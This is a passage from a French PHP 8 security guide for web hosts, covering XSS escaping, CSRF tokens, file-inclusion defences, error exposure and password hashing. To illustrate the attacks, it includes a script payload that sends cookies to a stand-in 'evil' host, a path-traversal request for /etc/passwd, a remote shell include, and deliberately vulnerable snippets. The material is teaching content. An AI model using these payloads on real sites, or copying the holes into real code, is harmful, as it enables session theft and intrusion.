---
id: collect-261001-rattrapage/rattrapage/php-guide-10
title: "PHP 8 — Le guide complet du sysadmin qui héberge"
domain: rattrapage
role: reference
task: reference
actors: []
dates: []
keywords: ["cost", "gpu", "memory"]
source: docs/RAG/collect-261001-rattrapage/php_guide.md
source_anchor: ""
source_lines: [2082, 2295]
sha256: 92e7c24b835be02c3dfd35420333347fe81780782bfccd16a6c99fff58f69bad
---

# PHP 8 — Le guide complet du sysadmin qui héberge

// --- ❌ VULNÉRABLE : affichage brut ---
echo $_POST['commentaire']; // attaquant : <script>fetch('https://evil/?c='+document.cookie)</script>

// --- ✅ CORRIGÉ : htmlspecialchars systématique ---
function e(string $s): string  // helper d'échappement (comme dans Laravel/Blade)
{
    return htmlspecialchars($s, ENT_QUOTES | ENT_HTML5, 'UTF-8');
}
?>
<p><?= e($commentaire) ?></p>              <!-- <?= = echo, toujours avec e() -->
<a href="/user/<?= e($pseudo) ?>">profil</a>
<input value="<?= e($site) ?>">

<?php
// --- Contexte attribut avec guillemets : ENT_QUOTES couvre " et ' ---
// --- Contexte URL : valider le schéma ---
$url = $_POST['site_web'] ?? '';
if (!preg_match('#^https?://#', $url)) {
    $url = ''; // refuse javascript:, data:, etc.
}
?>
<a href="<?= e($url) ?>">site</a>

<?php
// --- Contexte JavaScript : json_encode (pas htmlspecialchars !) ---
?>
<script>
const config = <?= json_encode($config, JSON_HEX_TAG | JSON_HEX_AMP | JSON_UNESCAPED_UNICODE) ?>;
</script>

<?php
// --- HTML riche (WYSIWYG) : purifier avec une lib (HTML Purifier), jamais strip_tags seul ---
// composer require ezyang/htmlpurifier
$purifier = new HTMLPurifier(HTMLPurifier_Config::createDefault());
$htmlPropre = $purifier->purify($htmlSaisi);
```

| Contexte de sortie | Protection |
|---|---|
| HTML texte / attribut | `htmlspecialchars(..., ENT_QUOTES, 'UTF-8')` |
| URL (`href`, `src`) | Whitelist schéma `https?://` + `htmlspecialchars` |
| JavaScript | `json_encode` avec flags `JSON_HEX_*` |
| HTML riche voulu | HTML Purifier (lib) |
| E-mail / CSV | Échapper selon le format (CSV : guillemets doublés) |

🔒 Avec `HttpOnly` sur les cookies de session (section 42), même une XSS résiduelle ne vole pas la session — **défense en profondeur**.

---

## 50. Sécurité : CSRF — les tokens

**Attaque :** un site malveillant fait soumettre à ton navigateur un formulaire vers ton appli (où tu es connecté) : `<img src="https://ton-appli/supprimer?id=42">`. Le navigateur envoie tes cookies → action exécutée à ton insu.

**Défense :** token secret par session, vérifié à chaque POST.

```php
<?php declare(strict_types=1);
session_start();

// --- Génération (une fois par session) ---
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32)); // 256 bits, random_int-grade
}

function csrfChamp(): string
{
    $token = htmlspecialchars($_SESSION['csrf_token'], ENT_QUOTES, 'UTF-8');
    return '<input type="hidden" name="csrf_token" value="' . $token . '">';
}

// --- Vérification (en tête de chaque traitement POST) ---
function verifierCsrf(): void
{
    $recu = $_POST['csrf_token'] ?? '';
    $attendu = $_SESSION['csrf_token'] ?? '';
    if ($attendu === '' || !hash_equals($attendu, $recu)) {
        http_response_code(403);
        exit('Jeton CSRF invalide.');
    }
}

// --- Usage ---
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    verifierCsrf(); // D'ABORD
    // ... traitement ...
}
?>
<form method="post">
    <?= csrfChamp() ?>
    <!-- champs -->
</form>
```

**Compléments :** `SameSite=Lax` sur les cookies (bloque l'envoi cross-site du cookie), actions destructrices **jamais en GET** (toujours POST + token), régénérer le token au login.


---

## 51. Sécurité : inclusion de fichiers (LFI/RFI)

```php
<?php declare(strict_types=1);

// --- ❌ LFI CLASSIQUE : page.php?page=../../etc/passwd ---
include $_GET['page'] . '.php'; // l'attaquant remonte l'arborescence

// --- ❌ RFI : allow_url_include=On + include http://evil/shell ---
// => exécution de code distant. (Heureusement désactivé par défaut depuis PHP 5.2,
// mais vérifie : allow_url_include=Off dans php.ini.)

// --- ✅ CORRIGÉ : whitelist de pages ---
$pagesAutorisees = [
    'accueil'       => __DIR__ . '/pages/accueil.php',
    'interventions' => __DIR__ . '/pages/interventions.php',
    'contact'       => __DIR__ . '/pages/contact.php',
];
$page = $_GET['page'] ?? 'accueil';
if (!isset($pagesAutorisees[$page])) {
    http_response_code(404);
    exit('Page introuvable.');
}
include $pagesAutorisees[$page]; // chemin 100 % contrôlé par nous

// --- ✅ Fichier par ID : basename + dossier fixe + vérification realpath ---
$fichier = basename($_GET['fichier'] ?? ''); // supprime tout chemin (../../ neutralisé)
$chemin = realpath(__DIR__ . '/documents/' . $fichier);
$base = realpath(__DIR__ . '/documents');
if ($chemin === false || !str_starts_with($chemin, $base)) {
    http_response_code(404);
    exit();
}
// $chemin est garanti dans /documents
```

**Règles :** jamais d'input utilisateur dans `include/require`, whitelist ou `basename`+`realpath`, `allow_url_include=Off` (vérifié), `open_basedir` en dernier rempart (voir section 62).

---

## 52. Sécurité : exposition d'erreurs en production

```php
<?php
// --- ❌ EN PROD : l'attaquant lit les chemins, versions, requêtes SQL ---
// display_errors = On  →  "Fatal error: Uncaught PDOException: SQLSTATE[HY000] ... in /var/www/appli/src/Db.php on line 42"

// --- ✅ php.ini prod (rappel) ---
// display_errors = Off
// display_startup_errors = Off
// log_errors = On

// --- ✅ Page d'erreur générique + ID de corrélation (voir section 34) ---
// L'utilisateur voit : "Erreur interne — Référence : a3f9c1"
// Toi tu cherches dans les logs : grep "a3f9c1" /var/log/php-fpm-error.log

// --- ❌ Stack trace dans une API : même combat ---
// header('Content-Type: application/json');
// echo json_encode(['erreur' => $e->getMessage()]); // ❌ fuit le SQL/la structure
// --- ✅ ---
http_response_code(500);
header('Content-Type: application/json');
echo json_encode(['erreur' => 'Erreur interne', 'reference' => $id]); // générique + traçable
```

📋 **Audit express :** `grep -rn "display_errors" /etc/php/*/fpm/php.ini` → `Off` partout ; `php -r 'phpinfo();'` jamais sur le web ; aucune `var_dump`/`print_r` oubliée (`grep -rn "var_dump" /var/www/appli/src`).

---

## 53. Sécurité : mots de passe — password_hash

```php
<?php declare(strict_types=1);

// --- ❌ À BANNIR : md5, sha1, sha256 simple (cassés en secondes par GPU) ---
// $hash = md5($password); // NON.

// --- ✅ Création : bcrypt (défaut) ou Argon2id ---
$hash = password_hash($motDePasse, PASSWORD_DEFAULT);
// PASSWORD_DEFAULT = bcrypt aujourd'hui, évoluera (PHP gère la compatibilité)
// Explicite : password_hash($mdp, PASSWORD_ARGON2ID, ['memory_cost' => 65536, 'time_cost' => 4, 'threads' => 2]);

// Stockage : colonne VARCHAR(255) (les algo évoluent, la taille aussi)

// --- ✅ Vérification ---
if (password_verify($motDePasseSaisi, $hashStocke)) {
    // OK — password_verify est en temps constant (anti timing attack)
    // --- Re-hachage si l'algo/coût a évolué ---
    if (password_needs_rehash($hashStocke, PASSWORD_DEFAULT)) {
        $nouveauHash = password_hash($motDePasseSaisi, PASSWORD_DEFAULT);
        // UPDATE users SET hash = ... WHERE id = ...
    }
    login($userId);
} else {
    // Message GÉNÉRIQUE : "Identifiants invalides." (ne pas dire si c'est le login ou le mdp)
    // + délai/rate-limit anti brute-force (voir plus bas)
}

// --- Politique de mot de passe : longueur > complexité ---
// Minimum 12 caractères. Vérifier contre une liste de mdp compromis (haveibeenpwned API k-anonymity)
// ou au minimum une petite liste locale de mots interdits :
$interdits = ['password', 'azerty123', 'entreprise2024'];
if (mb_strlen($mdp) < 12 || in_array(mb_strtolower($mdp), $interdits, true)) {
    $erreurs[] = 'Mot de passe trop faible (12 caractères minimum).';
}

// --- Anti brute-force : compteur en BDD/Redis ---
// Après 5 échecs sur un compte : verrouiller 15 min. Après 20 échecs sur une IP : bannir 1h (fail2ban).
```

---

## 54. Sécurité : en-têtes HTTP (à poser côté nginx)

La sécurité se joue aussi dans les en-têtes. À configurer dans nginx (section 56) :

